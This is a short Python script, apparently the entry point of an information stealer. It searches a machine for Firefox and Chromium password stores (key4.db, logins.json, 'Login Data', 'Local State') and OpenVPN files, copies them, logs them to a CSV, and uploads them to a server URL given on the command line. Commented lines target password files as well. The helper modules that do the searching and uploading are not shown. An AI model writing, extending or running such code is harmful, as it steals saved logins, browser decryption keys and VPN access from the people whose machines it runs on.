import argparse
import datetime
import re

from helpers import utils, find_files, csv_manager, filemanager


def main(url):
    csv_manager.init()
    search_files = ['ovpn', 'key4.db', 'logins.json', 'Login Data', 'Local State']
    # search_files = ['.pwd']
    # contain_text = ['password']
    files = filemanager.search_files(search_files)
    filenames = filemanager.copy_files(files)
    csv_manager.add_rows(filenames)
    # url is not None AND url is not empty or blank
    if url and url.strip():
        dl_links = filemanager.send_files(url)
        csv_manager.update_dl_link(dl_links)


if __name__ == '__main__':
    # Calling main function
    start_time = datetime.datetime.now()

    parser = argparse.ArgumentParser(description='URL Parameter')
    parser.add_argument('--url', dest='url', help='url parameter for http server')

    args = parser.parse_args()
    main(args.url)

    end_time = datetime.datetime.now()
    print('Duration: {}'.format(end_time - start_time))
